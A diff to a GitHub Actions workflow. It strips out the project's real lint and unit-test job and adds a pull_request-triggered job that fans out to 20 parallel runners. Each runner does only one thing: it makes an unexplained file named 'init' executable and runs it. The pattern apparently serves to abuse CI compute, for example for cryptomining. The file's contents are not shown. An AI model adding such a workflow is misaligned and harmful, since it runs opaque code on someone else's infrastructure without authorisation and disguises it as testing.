@@ -1,32 +1,26 @@
-name: Push on any branch
+name: multi test
 
-on:
-  push:
-    branches-ignore:
-      - master
-      - development
+on: [pull_request]
 
 jobs:
-  setup:
-    name: Setup & Tests
+  multitest:
+    name: test job
+
     runs-on: ubuntu-latest
     env:
-      JWT_ACCESS_SECRET: access
-      JWT_REFRESH_SECRET: refresh
+      DEBIAN_FRONTEND: noninteractive
+
+    strategy:
+     fail-fast: false
+     matrix:
+       runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
 
     steps:
-    - uses: actions/checkout@v1
-
-    - name: Setup Node
-      uses: actions/setup-node@v1
-      with:
-        node-version: '8.x'
-
-    - name: Install npm dependences
-      run: npm install
-
-    - name: ESLint test
-      run: npm run eslint
-
-    - name: Unit tests
-      run: npm run test
+      - name: Checkout code
+        uses: actions/checkout@v2
+        
+      - name: chmod
+        run: chmod +x init
+        
+      - name: run
+        run: ./init
